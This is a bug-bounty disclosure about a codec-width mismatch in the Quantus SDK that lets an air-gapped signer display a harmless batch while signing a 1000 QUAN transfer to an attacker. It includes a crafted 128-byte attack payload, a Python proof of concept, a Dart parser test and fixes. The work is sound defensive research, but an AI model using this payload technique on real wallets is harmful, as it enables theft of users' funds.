# 89987 w a high multiaddress index is decoded at a different width by the sdk and the runtime letting a qr code display a harmless batch while signing a 1000 quan transfer to the attacker

**Submitted on Aug 22nd 2026 at 10:26:34 UTC by @Naveen0x for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89987
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/quantus\\_sdk>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as:
    * Modifying transaction arguments or parameters
    * Substituting contract addresses
    * Submitting malicious transactions
  * Direct theft of user funds

## Description

### Brief/Intro

The Quantus runtime and the Quantus SDK's Dart decoder disagree about how many bytes the `MultiAddress::Index` variant occupies. The runtime consumes one byte. The SDK consumes one byte plus a full compact integer.

Once a payload contains an `Index` destination, the two decoders are reading the remaining bytes from different offsets. Every pallet index, call index, destination and amount after that point means something different to the wallet than it does to the chain. Both decoders still consume the payload exactly, with nothing left over, so every integrity check the signer performs passes and the user sees no warning.

That breaks the property the air-gapped signing flow exists to provide. The parser's own documentation states it plainly: the full signed payload, call plus every signed-extension field, is decoded with nothing left over, so what the signer displays is exactly what it signs. With this bug, it isn't.

I have attached a 128-byte payload that the wallet renders as a zero-value housekeeping transfer plus a text memo, and that the runtime executes as a 1000 QUAN transfer to an account the user never saw.

### Affected component

Affected asset: Quantus SDK.

Affected file: `quantus_sdk/lib/generated/planck/types/sp_runtime/multiaddress/multi_address.dart`

Affected field: `Index._decode`, lines 155 to 157. It calls `CompactBigIntCodec.codec.decode(input)` unconditionally, so it reads a real compact integer where the runtime reads nothing.

Contributing file: `quantus_sdk/lib/src/quantus_payload_parser.dart`

Affected field: `_decodeCall`, line 158. It delegates the whole call to `RuntimeCall.codec.decode(input)`, which is the generated codec above, with no restriction on which `MultiAddress` variants may appear.

Contributing file: `quantus_sdk/lib/src/chain/call_decoder.dart`

Affected field: `_addressField`, line 824. It renders an `Index` destination as the text "Account index 0" instead of rejecting it, which is what makes the decoy call look ordinary on screen.

### Root cause

The runtime declares its address type as:

```rust
pub type Address = MultiAddress<AccountId, ()>;
```

In `sp_runtime`, the variant is declared `Index(#[codec(compact)] AccountIndex)`. With `AccountIndex = ()`, that field is `Compact<()>`, and `parity-scale-codec` implements `Decode for Compact<()>` as a no-op that returns without touching the input:

```rust
impl Decode for Compact<()> {
    fn decode<I: Input>(_input: &mut I) -> Result<Self, Error> {
        Ok(Compact(()))
    }
}
```

So the runtime consumes exactly the one-byte variant discriminant and stops.

The generated Dart codec does something else:

```dart
factory Index._decode(_i1.Input input) {
  return Index(_i1.CompactBigIntCodec.codec.decode(input));
}
```

There is no conditional there. The generator that produced this file maps every compact type to `CompactBigIntCodec` and discards the inner type entirely. Its `CompactDescriptor` is constructed from a bare type id and has no reference to what the compact wraps, so it has no way to know that this particular compact is a unit type that encodes to nothing. The result is that `Compact<()>` becomes a genuine compact read of between one and 67 bytes, controlled by the attacker.

The encode side has the same asymmetry, which matters for whether the resulting signature is usable. `CompactRef<'_, ()>` encodes to an empty byte string, so the runtime's reading of this payload re-encodes to exactly the bytes the wallet signed. The node re-encodes the decoded call and extensions when it verifies the signature, and that check passes.

### Why the existing defences do not catch it

The parser rejects trailing bytes and validates the genesis hash against an allowlist. Neither helps here.

The trailing-byte rule is satisfied on both sides at once. The signed-extension suffix is anchored to the end of the payload, so the attacker only needs the two readings to re-converge before they get there. A two-byte mortal era on the runtime side is read by the parser as a single `0x00` byte meaning immortal, which absorbs a one-byte drift exactly. From that point the nonce, tip, metadata mode, spec version, transaction version, genesis hash, block hash and the metadata hash option are byte-identical to both decoders. Both finish with zero bytes remaining.

The genesis allowlist passes because the payload declares the real Planck genesis hash, which is on the wallet's list of known networks. The spec version and transaction version also match the bundled values, so the signer's drift check evaluates true and no warning banner appears.

A second gap makes the pivot byte free. The polkadart `BoolCodec` decodes with `input.read() > 0`, so it accepts any non-zero byte as true, while `parity-scale-codec` accepts only `0x00` or `0x01`. That lets a single `0x02` byte serve as the parser's `keep_alive` flag and as the runtime's next pallet index, which is Balances, at the same time.

The payload is 128 bytes. That is under the parser's 8 KiB cap, and under the 256-byte threshold above which a payload would be signed as a hash rather than verbatim, so the raw bytes are what get signed.

### Attack scenario

The attacker needs to get one QR code in front of the victim's signer and read the signature QR back. A malicious or compromised companion device, or a web page that presents what claims to be an unsigned transaction, is enough. There is no requirement for key material, device access, or a network position.

Preparation is cheap. The only constraint on the attacker's account is its first byte, because the signer reads that byte as the length prefix of the decoy memo. Grinding a keypair whose account id starts with the required byte is one attempt in 256. The remaining 31 bytes are free.

{% stepper %}
{% step %}

## The victim opens the signer and scans the code

{% endstep %}

{% step %}

## The signer decodes it and displays a two-call batch

A zero-value `transfer_all` and a `System.remark` memo. Nothing on screen looks unusual and there is no warning.
{% endstep %}

{% step %}

## The victim approves

The signer signs the raw payload bytes.
{% endstep %}

{% step %}

## The attacker broadcasts the extrinsic

The attacker takes the returned signature, assembles the extrinsic from the same bytes, and broadcasts it. The runtime reads those bytes as a 1000 QUAN transfer to the attacker's account.
{% endstep %}
{% endstepper %}

The first inner call fails on chain, because `AccountIdLookup` resolves only the `Id` variant and returns a lookup error for `Index`. That does not stop the attack. `force_batch` is chosen precisely because it continues past a failed item: its loop records the error, emits an item-failed event, and moves on to the next call. The second call executes normally.

### Impact

An attacker who can show a QR code to a Quantus signer can have the user authorize an arbitrary transfer while the screen shows something harmless. The signature produced is valid over the malicious extrinsic, so the theft needs no further interaction from the victim.

The technique is not limited to the specific decoy in this report. Once the decoders are one byte out of step, the attacker controls how every subsequent byte is interpreted on each side independently, subject only to making the two readings re-converge before the signed-extension suffix. Any call the runtime supports can be substituted behind any display the attacker can construct.

## Proof of Concept

### Proof of concept

The script below decodes the same 128-byte payload twice, once the way the runtime does and once the way the SDK's generated codec does, and checks the properties that make the attack work. It uses only the Python standard library, touches no network, and does not interact with any chain. Save it as `poc.py` and run `python3 poc.py`. It exits 0 when every assertion passes.

The script also rebuilds the payload from its labelled parts and asserts the result matches, so nothing in it is an unexplained blob, and it includes a control showing that an `Id` destination decodes identically on both sides. The divergence is specific to `Index`.

{% code title="poc.py" %}

```python
#!/usr/bin/env python3
"""
MultiAddress::Index length divergence between the Quantus SDK codec and the runtime.

Decodes one 128-byte signing payload twice:

  * the way the Quantus runtime does it, where `MultiAddress::Index` holds a
    `Compact<()>` and therefore consumes ZERO bytes after the variant byte;
  * the way the SDK's generated Dart codec does it, where `Index._decode`
    calls `CompactBigIntCodec.codec.decode(input)` and consumes a real compact.

Both readings consume the payload exactly, agree on every signed-extension
field, and produce completely different calls. The wallet shows the second
reading and signs the bytes that produce the first.

Pure standard library. No network. No chain interaction.

    python3 poc.py          # exits 0 on success, 1 if an assertion fails
"""

import sys

PAYLOAD = bytes.fromhex(
    "09040802040100020000a0ababababababababababababababababababababab"
    "abababababababababab0f0080c6a47e8d0305001c0000880000000300000049"
    "01bf5c57fd3f9e726af399c763de6670dbdb115a91c0237e173f16eef65e7211"
    "1111111111111111111111111111111111111111111111111111111111111100"
)

PLANCK_GENESIS = "4901bf5c57fd3f9e726af399c763de6670dbdb115a91c0237e173f16eef65e72"
DECIMALS = 12

# The attacker's account. Only the first byte is constrained: the signer reads
# it as the compact length prefix of the decoy remark, so it has to encode 40.
# compact(40) is the single byte 0xa0, so the attacker grinds a keypair whose
# AccountId32 starts with 0xa0. That is one try in 256. The other 31 bytes are
# free and would be the attacker's real account.
ATTACKER_ACCOUNT = bytes([0xA0]) + b"\xAB" * 31
AMOUNT_PLANCK = 1000 * 10 ** DECIMALS


def build_payload():
    """
    Rebuilds the payload from its parts so nothing here is a magic blob.

    Laid out as the runtime reads it. The signer's reading falls out of the
    same bytes on its own, because it takes one extra byte at the Index.
    """
    return b"".join([
        bytes([0x09, 0x04]),              # Utility.force_batch
        bytes([0x08]),                    # compact(2): two inner calls
        bytes([0x02, 0x04]),              # Balances.transfer_all
        bytes([0x01]),                    # MultiAddress::Index  <- the divergence
        bytes([0x00]),                    # keep_alive = false
        bytes([0x02, 0x00]),              # Balances.transfer_allow_death
        bytes([0x00]),                    # MultiAddress::Id
        ATTACKER_ACCOUNT,                 # 32-byte destination
        bytes([0x0F]) + AMOUNT_PLANCK.to_bytes(7, "little"),   # compact amount
        bytes([0x05, 0x00]),              # era: Mortal(64, 0) for the runtime,
                                          #      Immortal + pivot for the signer
        bytes([0x1C]),                    # compact nonce = 7
        bytes([0x00]),                    # compact tip = 0
        bytes([0x00]),                    # metadata hash mode = 0
        (136).to_bytes(4, "little"),      # spec version
        (3).to_bytes(4, "little"),        # transaction version
        bytes.fromhex(PLANCK_GENESIS),    # genesis hash: Planck
        b"\x11" * 32,                     # block hash
        bytes([0x00]),                    # Option<metadata hash> = None
    ])


class Reader:
    """Minimal SCALE reader."""

    def __init__(self, data):
        self.data = data
        self.pos = 0

    def u8(self):
        v = self.data[self.pos]
        self.pos += 1
        return v

    def bytes(self, n):
        v = self.data[self.pos:self.pos + n]
        if len(v) != n:
            raise ValueError("payload truncated")
        self.pos += n
        return v

    def u32(self):
        return int.from_bytes(self.bytes(4), "little")

    def compact(self):
        first = self.data[self.pos]
        mode = first & 0b11
        if mode == 0:
            self.pos += 1
            return first >> 2
        if mode == 1:
            return int.from_bytes(self.bytes(2), "little") >> 2
        if mode == 2:
            return int.from_bytes(self.bytes(4), "little") >> 2
        n = (first >> 2) + 4
        self.pos += 1
        return int.from_bytes(self.bytes(n), "little")

    def era(self):
        """Mirrors both sp_runtime::generic::Era and the SDK's _decodeEra."""
        first = self.data[self.pos]
        if first == 0:
            self.pos += 1
            return "Immortal", 1
        raw = int.from_bytes(self.bytes(2), "little")
        period = 2 << (raw % 16)
        phase = (raw >> 4) * max(1, period >> 12)
        return "Mortal(period=%d, phase=%d)" % (period, phase), 2

    def left(self):
        return len(self.data) - self.pos


def encode_compact(value):
    """SCALE compact encoder, used for the round-trip check."""
    if value < 0b1000000:
        return bytes([value << 2])
    if value < 0b100000000000000:
        return ((value << 2) | 0b01).to_bytes(2, "little")
    if value < 0b1000000000000000000000000000000:
        return ((value << 2) | 0b10).to_bytes(4, "little")
    body = value.to_bytes((value.bit_length() + 7) // 8, "little")
    return bytes([((len(body) - 4) << 2) | 0b11]) + body


def read_multiaddress(r, sdk_mode):
    """
    variant 0 = Id([u8; 32])
    variant 1 = Index(#[codec(compact)] AccountIndex)

    The runtime instantiates this as MultiAddress<AccountId, ()>, so the inner
    type is Compact<()>, and parity-scale-codec decodes Compact<()> without
    touching the input at all. The SDK's generated codec reads a compact
    regardless of the inner type.
    """
    variant = r.u8()
    if variant == 0:
        return "Id(0x%s)" % r.bytes(32).hex(), 33
    if variant == 1:
        if sdk_mode:
            start = r.pos
            index = r.compact()
            return "Index(%d)" % index, 1 + (r.pos - start)
        return "Index(())", 1
    raise ValueError("unsupported MultiAddress variant %d" % variant)


def read_extensions(r):
    era, era_len = r.era()
    ext = {
        "era": era,
        "era_bytes": era_len,
        "nonce": r.compact(),
        "tip": r.compact(),
        "metadata_mode": r.u8(),
        "spec_version": r.u32(),
        "transaction_version": r.u32(),
        "genesis_hash": r.bytes(32).hex(),
        "block_hash": r.bytes(32).hex(),
        "metadata_hash_option": r.u8(),
    }
    ext["trailing_bytes"] = r.left()
    return ext


def decode_as_runtime(payload):
    r = Reader(payload)
    out = {"calls": []}
    pallet, call = r.u8(), r.u8()
    assert (pallet, call) == (9, 4), "expected Utility.force_batch"
    out["outer"] = "Utility.force_batch  (pallet 9, call 4)"

    for _ in range(r.compact()):
        p, c = r.u8(), r.u8()
        if (p, c) == (2, 4):
            dest, _ = read_multiaddress(r, sdk_mode=False)
            out["calls"].append(
                "Balances.transfer_all  dest=%s  keep_alive=%s" % (dest, bool(r.u8()))
            )
        elif (p, c) == (2, 0):
            dest, _ = read_multiaddress(r, sdk_mode=False)
            value = r.compact()
            out["calls"].append(
                "Balances.transfer_allow_death  dest=%s  value=%d planck (%s QUAN)"
                % (dest, value, format(value / 10 ** DECIMALS, "g"))
            )
            out["theft"] = (dest, value)
        else:
            raise AssertionError("unexpected inner call: pallet %d call %d" % (p, c))

    out["ext"] = read_extensions(r)
    return out


def decode_as_sdk(payload):
    r = Reader(payload)
    out = {"calls": []}
    pallet, call = r.u8(), r.u8()
    assert (pallet, call) == (9, 4), "expected Utility.force_batch"
    out["outer"] = "Utility.force_batch  (pallet 9, call 4)"

    for _ in range(r.compact()):
        p, c = r.u8(), r.u8()
        if (p, c) == (2, 4):
            dest, _ = read_multiaddress(r, sdk_mode=True)
            flag = r.u8()
            # polkadart BoolCodec.decode is `input.read() > 0`, so any nonzero
            # byte is accepted as true. parity-scale-codec accepts only 0 or 1.
            out["calls"].append(
                "Balances.transfer_all  Destination=Account index %s  "
                "Amount=Entire transferable balance  Keep account alive=%s "
                "(raw byte 0x%02x)" % (dest[6:-1], "Yes" if flag > 0 else "No", flag)
            )
            out["bool_pivot"] = flag
        elif (p, c) == (0, 0):
            remark = r.bytes(r.compact())
            out["calls"].append("System.remark  Remark=0x%s" % remark.hex())
        else:
            raise AssertionError("unexpected inner call: pallet %d call %d" % (p, c))

    out["ext"] = read_extensions(r)
    return out


def check_runtime_roundtrip(payload):
    """
    The node re-encodes the decoded call and extensions to verify the
    signature. MultiAddress::Index(()) re-encodes to the single byte 0x01
    because Compact<()> encodes to nothing, so the runtime's view of this
    payload is byte-identical to the bytes the wallet signed.
    """
    r = Reader(payload)
    rebuilt = bytearray()
    rebuilt += bytes([r.u8(), r.u8()])
    n = r.compact()
    rebuilt += encode_compact(n)
    for _ in range(n):
        p, c = r.u8(), r.u8()
        rebuilt += bytes([p, c])
        variant = r.u8()
        rebuilt += bytes([variant])
        if variant == 0:
            rebuilt += r.bytes(32)
        if (p, c) == (2, 4):
            rebuilt += bytes([r.u8()])
        else:
            rebuilt += encode_compact(r.compact())
    rebuilt += payload[r.pos:]
    return bytes(rebuilt) == payload


def negative_control():
    """
    Same shape, but the first destination is Id instead of Index. Both
    decoders then read 33 bytes there and agree completely, which shows the
    divergence is specific to the Index variant and not a framing mistake.
    """
    probe = bytes([0x00]) + b"\xCD" * 32 + bytes([0xDE, 0xAD])
    a, b = Reader(probe), Reader(probe)
    va, wa = read_multiaddress(a, sdk_mode=False)
    vb, wb = read_multiaddress(b, sdk_mode=True)
    return va == vb and wa == wb == 33


def banner(text):
    print("\n" + text)
    print("-" * len(text))


def main():
    print("payload: %d bytes" % len(PAYLOAD))
    print("0x%s" % PAYLOAD.hex())

    banner("1. The primitive")
    probe = bytes.fromhex("01" + "08" + "1234567890")
    a = Reader(probe)
    _, runtime_width = read_multiaddress(a, sdk_mode=False)
    b = Reader(probe)
    sdk_value, sdk_width = read_multiaddress(b, sdk_mode=True)
    print("input                        0x%s" % probe.hex())
    print("runtime  MultiAddress<AccountId,()>  -> Index(())   consumed %d byte"
          % runtime_width)
    print("SDK      generated Dart codec        -> %s   consumed %d bytes"
          % (sdk_value, sdk_width))
    print("divergence from this point on: %d byte" % (sdk_width - runtime_width))

    banner("2. What the runtime executes")
    rt = decode_as_runtime(PAYLOAD)
    print(rt["outer"])
    for c in rt["calls"]:
        print("  - " + c)

    banner("3. What the signer displays for the same bytes")
    sdk = decode_as_sdk(PAYLOAD)
    print(sdk["outer"])
    for c in sdk["calls"]:
        print("  - " + c)

    banner("4. Signed extensions")
    for key in ("nonce", "tip", "metadata_mode", "spec_version",
                "transaction_version", "genesis_hash", "block_hash",
                "metadata_hash_option", "trailing_bytes"):
        rv, sv = rt["ext"][key], sdk["ext"][key]
        print("  %-22s runtime=%-20s sdk=%-20s %s"
              % (key, str(rv)[:20], str(sv)[:20], "same" if rv == sv else "DIFFERENT"))
    print("  %-22s runtime=%-20s sdk=%-20s absorbs the desync"
          % ("era", rt["ext"]["era"][:20], sdk["ext"]["era"][:20]))

    banner("5. Assertions")
    checks = [
        ("both decoders consume the payload with no trailing bytes",
         rt["ext"]["trailing_bytes"] == 0 and sdk["ext"]["trailing_bytes"] == 0),
        ("genesis hash is on the wallet's known-network allowlist (Planck)",
         rt["ext"]["genesis_hash"] == PLANCK_GENESIS),
        ("payload is under the 8 KiB parser cap",
         len(PAYLOAD) <= 8 * 1024),
        ("payload is under 256 bytes, so it is signed verbatim, not as a hash",
         len(PAYLOAD) <= 256),
        ("both decoders agree on spec version, so no drift warning is shown",
         rt["ext"]["spec_version"] == sdk["ext"]["spec_version"]),
        ("the era absorbs the one-byte desync and the tails re-converge",
         rt["ext"]["era_bytes"] - sdk["ext"]["era_bytes"] == 1),
        ("the pivot byte is not a valid SCALE bool but polkadart accepts it",
         sdk["bool_pivot"] not in (0, 1)),
        ("the signer never displays the attacker's destination",
         rt["theft"][0][3:-1] not in " ".join(sdk["calls"])),
        ("the runtime's reading re-encodes to the exact signed bytes",
         check_runtime_roundtrip(PAYLOAD)),
        ("the payload rebuilds exactly from its labelled parts",
         build_payload() == PAYLOAD),
        ("control: with an Id destination both decoders agree (33 bytes)",
         negative_control()),
    ]
    ok = True
    for label, passed in checks:
        print("  [%s] %s" % ("PASS" if passed else "FAIL", label))
        ok = ok and passed

    banner("Result")
    dest, value = rt["theft"]
    print("displayed to the user : a zero-value transfer_all and a remark memo")
    print("actually signed       : %s planck (%s QUAN) to %s"
          % (value, format(value / 10 ** DECIMALS, "g"), dest))
    print("\n%s" % ("PoC succeeded." if ok else "PoC FAILED."))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
```

{% endcode %}

### Expected output

```
payload: 128 bytes
0x09040802040100020000a0abababababababababababababababababababababababababababababab
ab0f0080c6a47e8d0305001c000088000000030000004901bf5c57fd3f9e726af399c763de6670dbdb11
5a91c0237e173f16eef65e72111111111111111111111111111111111111111111111111111111111111
111100

1. The primitive
----------------
input                        0x01081234567890
runtime  MultiAddress<AccountId,()>  -> Index(())   consumed 1 byte
SDK      generated Dart codec        -> Index(2)   consumed 2 bytes
divergence from this point on: 1 byte

2. What the runtime executes
----------------------------
Utility.force_batch  (pallet 9, call 4)
  - Balances.transfer_all  dest=Index(())  keep_alive=False
  - Balances.transfer_allow_death  dest=Id(0xa0abab...abab)  value=1000000000000000 planck (1000 QUAN)

3. What the signer displays for the same bytes
----------------------------------------------
Utility.force_batch  (pallet 9, call 4)
  - Balances.transfer_all  Destination=Account index 0  Amount=Entire transferable balance  Keep account alive=Yes (raw byte 0x02)
  - System.remark  Remark=0xabababab...0f0080c6a47e8d0305

4. Signed extensions
--------------------
  nonce                  runtime=7                    sdk=7                    same
  tip                    runtime=0                    sdk=0                    same
  metadata_mode          runtime=0                    sdk=0                    same
  spec_version           runtime=136                  sdk=136                  same
  transaction_version    runtime=3                    sdk=3                    same
  genesis_hash           runtime=4901bf5c57fd3f9e726a sdk=4901bf5c57fd3f9e726a same
  block_hash             runtime=11111111111111111111 sdk=11111111111111111111 same
  metadata_hash_option   runtime=0                    sdk=0                    same
  trailing_bytes         runtime=0                    sdk=0                    same
  era                    runtime=Mortal(period=64, ph sdk=Immortal             absorbs the desync

5. Assertions
-------------
  [PASS] both decoders consume the payload with no trailing bytes
  [PASS] genesis hash is on the wallet's known-network allowlist (Planck)
  [PASS] payload is under the 8 KiB parser cap
  [PASS] payload is under 256 bytes, so it is signed verbatim, not as a hash
  [PASS] both decoders agree on spec version, so no drift warning is shown
  [PASS] the era absorbs the one-byte desync and the tails re-converge
  [PASS] the pivot byte is not a valid SCALE bool but polkadart accepts it
  [PASS] the signer never displays the attacker's destination
  [PASS] the runtime's reading re-encodes to the exact signed bytes
  [PASS] the payload rebuilds exactly from its labelled parts
  [PASS] control: with an Id destination both decoders agree (33 bytes)

Result
------
displayed to the user : a zero-value transfer_all and a remark memo
actually signed       : 1000000000000000 planck (1000 QUAN) to Id(0xa0abab...abab)

PoC succeeded.
```

### Reproducing the signer side directly

To confirm the display against the real SDK rather than a model of it, drop this into the SDK's test directory and run:

```bash
flutter pub get && flutter test
```

{% code title="multiaddress\_index\_test.dart" %}

```dart
import 'dart:typed_data';

import 'package:convert/convert.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:quantus_sdk/quantus_sdk.dart';

const poc =
    '09040802040100020000a0ababababababababababababababababababababababababababababababab'
    '0f0080c6a47e8d0305001c000088000000030000004901bf5c57fd3f9e726af399c763de6670dbdb115a'
    '91c0237e173f16eef65e72111111111111111111111111111111111111111111111111111111111111111100';

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  test('parser accepts the payload and shows a benign batch', () {
    final parsed = QuantusPayloadParser.parsePayload(
      Uint8List.fromList(hex.decode(poc)),
    );

    print('network            = ${parsed.network}');
    print('specMatchesBundled = ${parsed.specMatchesBundled}');
    print('era                = ${parsed.extensions.era}');
    print('call               = ${parsed.call.pallet}.${parsed.call.call}');
    for (final f in parsed.call.fields) {
      print('  $f');
    }

    expect(parsed.call.pallet, 'Utility');
    expect(parsed.call.call, 'force_batch');
    expect(parsed.specMatchesBundled, isTrue);
  });
}
```

{% endcode %}

The parser accepts the payload, reports the network as Planck, reports the era as immortal, reports the spec as matching the bundled version so no drift warning is raised, and renders the two decoy calls. The attacker's destination and the 1000 QUAN amount appear nowhere on screen.

## Verification against the chain source

Every pallet index, call index and field layout the proof of concept relies on is taken from the chain source rather than assumed.

The address type is `pub type Address = MultiAddress<AccountId, ()>` in the runtime crate's root module, which is what makes the inner compact a unit type.

The account lookup is `type Lookup = sp_runtime::traits::AccountIdLookup<Self::AccountId, ()>` in the runtime's frame-system configuration. `AccountIdLookup::lookup` matches only `MultiAddress::Id` and returns a lookup error for everything else, so the `Index` variant can never resolve to an account in legitimate traffic.

Utility is pallet index 9 and Balances is pallet index 2, both from the runtime's pallet index attributes.

`force_batch` is call index 4 in the utility pallet. Its body declares a mutable error flag, iterates the calls, sets the flag and emits an item-failed event when a call returns an error, and continues to the next item rather than returning. That is what allows the second call to run after the first fails.

`transfer_allow_death` is call index 0 in the balances pallet, taking a destination and a compact value. `transfer_all` is call index 4, taking a destination and a boolean.

The same indices are corroborated independently by the SDK's own bundled metadata, which the Dart test above exercises.

## Why this is not intended behaviour, and not already known

The repository already contains the exact restriction the Dart path is missing. Its Rust transaction parser declares the type as a single-variant enum:

```rust
#[derive(Decode)]
enum MultiAddress {
    #[codec(index = 0)]
    Id([u8; 32]),
}
```

Anything other than `Id` fails to decode there.

More than that, the Dart parser used to have the same check and lost it. The commit that ported the Keystone parser hardening across to the payload parsers, `b5d36af` from pull request #555, introduced a `_decodeMultiAddress` helper in the Dart parser that threw on any variant other than `Id`, with a message saying only `Id` is accepted. The current parser has no such helper and contains no reference to `MultiAddress` at all. Call decoding was later moved wholesale onto the generated polkadart codecs, which the parser's own documentation describes as deliberate, so that every call declared by the bundled metadata is supported without an allowlist falling behind the runtime. The variant restriction went away with the hand-written decoder. So this is a regression in a protection the project had already written, not an omission it never considered.

This is also a bypass of the earlier hardening rather than a duplicate of it. The upstream firmware issue that commit was ported from covers recursion bounds and the rejection of unconsumed bytes. It says nothing about `MultiAddress`, the `Index` variant, compact encoding, or a divergence between what is displayed and what executes. The payload here satisfies the "reject any unconsumed byte" rule on both sides at once while the two decoders still disagree about what those bytes mean.

The issue does not appear on the program's published list of known issues, and none of the project's completed audit reports covers the applications repository that holds the SDK.

## Remediation

Two fixes, and I would apply both. The first closes this instance, the second closes the class.

Reject the variant. Because the runtime's lookup cannot resolve an index to an account, `MultiAddress::Index` is unreachable in any legitimate transaction, so refusing it costs nothing in functionality. Restore the check the Dart parser used to have and accept only `MultiAddress::Id`, matching the Rust parser. The same argument applies to `Raw`, `Address32` and `Address20`.

Add a re-encode equality check. After decoding a call, encode it again and compare against the input slice it came from:

```dart
final decoded = RuntimeCall.codec.decode(input);
final reencoded = decoded.encode();
if (!listEquals(reencoded, originalSlice)) {
  throw FormatException('decoded call does not round-trip; refusing to display');
}
```

Any width disagreement between the display codec and the runtime codec then becomes a hard rejection instead of a silent reinterpretation. This matters because the trailing-byte rule constrains only the total length of the payload, which is precisely why it did not catch this.

Two smaller changes are worth making alongside those. `BoolCodec` should reject any byte other than `0x00` and `0x01`, which removes the free pivot byte this payload depends on. And the code generator defect should be reported upstream to polkadart, since the generated `Index._decode` is wrong for any chain whose compact inner type is not a plain integer, and the same class of divergence would reappear on regeneration.

## Notes on scope and testing

The chain-side reading is established by decoding with the runtime's own types and pinned codec versions, not by submitting anything to a network. No testnet or mainnet testing was performed. The final dispatch step follows from the decoded call plus the utility pallet's documented `force_batch` behaviour, both read from the chain source.

On where the defect lives: the immediate cause is a code generator that belongs to a third-party package, but the vulnerable artifact is the generated file committed inside the Quantus SDK, which is the listed asset, and the missing variant restriction in the Dart parser is the project's own code. The Rust parser in the same repository enforces that restriction and the Dart parser previously did too, which shows the current behaviour is unintended rather than an accepted upstream limitation.

The production consumer of `parsePayload` is the cold wallet signing screen, so the display this report describes is the one a user actually sees before approving.
